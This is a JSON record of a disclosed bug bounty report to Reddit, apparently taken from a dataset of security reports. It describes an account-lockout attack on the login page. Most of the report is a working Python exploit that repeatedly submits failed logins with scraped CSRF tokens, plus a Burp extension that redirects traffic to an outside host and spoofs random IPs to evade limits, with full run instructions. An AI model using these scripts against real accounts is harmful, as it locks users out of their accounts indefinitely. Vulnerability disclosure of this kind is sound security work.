{
    "reported_to": "Reddit",
    "reported_by": "ug0x01 ",
    "title": "Misconfigurated login page able to lock login action for any account without user interaction",
    "content": "\nSummary\nWhile observing a few things about the login feature, I found that the account was locked after a certain number of requests. Although this feature is actually added to prevent problems such as rate limit, it is open to account lock attacks by attackers.\nPoC\nSave this code as exploit.py:\nCode 1.83 KiB\n1#!/bin/python3\n2\n3from requests import get, post\n4from sys import argv\n5from warnings import filterwarnings\n6from time import sleep\n7from concurrent.futures import ThreadPoolExecutor\n8\n9filterwarnings(\"ignore\")\n10\n11def get_creds():\n12    res = get(\"https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled\")\n13    \n14    csrf_token = res.text.split('name=\"csrf_token\" value=\"')[1].split('\">')[0]\n15    \n16    return res.cookies.get_dict(), csrf_token\n17\n18def lock_account(account, cookie, csrf_token):\n19    post(\"https://www.reddit.com/login\", cookies=cookie, proxies={\"http\": \"http://127.0.0.1:8080\", \"https\": \"http://127.0.0.1:8080\"}, data={\"csrf_token\": csrf_token, \"otp\": '', \"password\": \"asdasdasasdasd231321d\", \"dest\": \"https://www.reddit.com\", \"username\": account}, headers={\"User-Agent\": \"Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0\", \"Accept\": \"*/*\", \"Accept-Language\": \"en-US,en;q=0.5\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"application/x-www-form-urlencoded\", \"Origin\": \"https://www.reddit.com\", \"Sec-Fetch-Dest\": \"empty\", \"Sec-Fetch-Mode\": \"cors\", \"Sec-Fetch-Site\": \"same-origin\", \"Referer\": \"https://www.reddit.com/login/?experiment_d2x_2020ify_buttons=enabled&experiment_d2x_sso_login_link=enabled&experiment_d2x_google_sso_gis_parity=enabled&experiment_d2x_onboarding=enabled\", \"Connection\": \"close\"}, verify=False)\n20\n21cookie, csrf_token = get_creds()\n22    \n23for _ in range(14):\n24    ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)\n25\n26print(\"Account Locked!!\")\n27        \n28sleep(60)\n29    \n30while True:\n31    cookie, csrf_token = get_creds()\n32    \n33    for _ in range(14):\n34        ThreadPoolExecutor(max_workers=15).submit(lock_account, str(argv[1]), cookie, csrf_token)\n35        \n36    sleep(60)\nSave this code as helper.py:\nCode 1.29 KiB\n1from burp import IBurpExtender\n2from burp import IHttpListener\n3\n4import random\n5import socket\n6import struct\n7\n8HOST_FROM = \"www.reddit.com\"\n9HOST_TO = \"ugroon.link\"\n10\n11class BurpExtender(IBurpExtender, IHttpListener):\n12    def registerExtenderCallbacks(self, callbacks):\n13        self._helpers = callbacks.getHelpers()\n14        \n15        callbacks.setExtensionName(\"Traffic redirector\")\n16        callbacks.registerHttpListener(self)\n17\n18    def processHttpMessage(self, toolFlag, messageIsRequest, messageInfo):\n19        helpers = self._helpers\n20        if not messageIsRequest:\n21            return\n22        httpService = messageInfo.getHttpService()\n23\n24        if (HOST_FROM == httpService.getHost()):\n25            message = helpers.bytesToString(messageInfo.getRequest())\n26            message = message.replace(\"Host: \" + HOST_FROM, \"Host: \" + HOST_TO)\n27            message_array = message.split(\"\\n\")\n28            random_ip = socket.inet_ntoa(struct.pack('>I', random.randint(1, 0xffffffff)))\n29            message_array.insert(3, \"X-My-X-Forwarded-For: \" + random_ip)\n30            message = \"\\n\".join(message_array)\n31            \n32            print(message)\n33            \n34            message = helpers.stringToBytes(message)\n35            messageInfo.setHttpService(self._helpers.buildHttpService(HOST_TO,httpService.getPort(),httpService.getProtocol()))\n36\nDownload jython 2.7.0 (http://search.maven.org/remotecontent?filepath=org/python/jython-standalone/2.7.0/jython-standalone-2.7.0.jar)\nDownload a burp which is older than 2021 version (new versions giving too many errors)\nSet jython 2.7.0 with Extender > Options > Python Environment > Location of Jython standalone JAR file > jython 2.7.0 location\nUpload helper.py to extensions with Extender > Extensions > Burp Extensions > Add > helper.py location\nIf you use linux, use chmod +x exploit.py for set permissions. But if you use windows, directly go to path and do next step\nRun the exploit with python3 exploit.py usernameofvictim and that's all.\nAnd for check to exploit work or not, try to login victim account on another device or change IP address and use a different browser for 0 track and you will see it's impossible to login account.\nPoC video\nSuggested Solutions\nTo avoid issues like rate limit, use protections like captcha instead of using such protection\nNotes\nOn the login screen it says the account has been locked for 5 minutes. However, the exploit restarts the attack every 5 minutes, so victim can \"never\" login into the victim account (added for avoid misunderstandings)\nIf you have any questions or what you think is wrong with the report/impact, please mark it as needs more info before closing the report and let me answer your questions.\nCheers,\n@h1ugroon\nImpact\nOnce the attacker starts the attack for the victim account, victim will never be able to login his/her account until the attacker stops the attack.\n\n",
    "severity": [
        9.3,
        null
    ],
    "bounty": null,
    "weaknesses": [
        "None"
    ],
    "screenshots": {},
    "disclosed_date": 1654571400,
    "report_url": "https://hackerone.com/reports/1582778",
    "is_multi_component": true,
    "complexity": "MEDIUM",
    "novelty": "MEDIUM",
    "vuln_category": "WEB_APP",
    "steps": [
        [
            1,
            "Save the provided exploit.py and helper.py scripts to your local machine."
        ],
        [
            2,
            "Run the exploit.py script with the target username as an argument: `python3 exploit.py usernameofvictim`."
        ],
        [
            3,
            "Observe that the target account is locked and cannot log in until the attack is stopped."
        ]
    ],
    "vuln_description": "The vulnerability allows an attacker to lock any user's account by exploiting a misconfigured login page that locks the account after a certain number of failed login attempts. The attacker can continuously send failed login requests, preventing the victim from logging in indefinitely.",
    "reason": "The attack involves multiple components, including crafting and sending malicious requests, handling CSRF tokens, and maintaining the attack over time. However, the steps are straightforward once the initial setup is complete, and the interaction between components is not particularly subtle or complex.",
    "new_complexity": "MEDIUM",
    "requires_code": false,
    "requires_CVE": false,
    "is_ctf": false,
    "other_report": null
}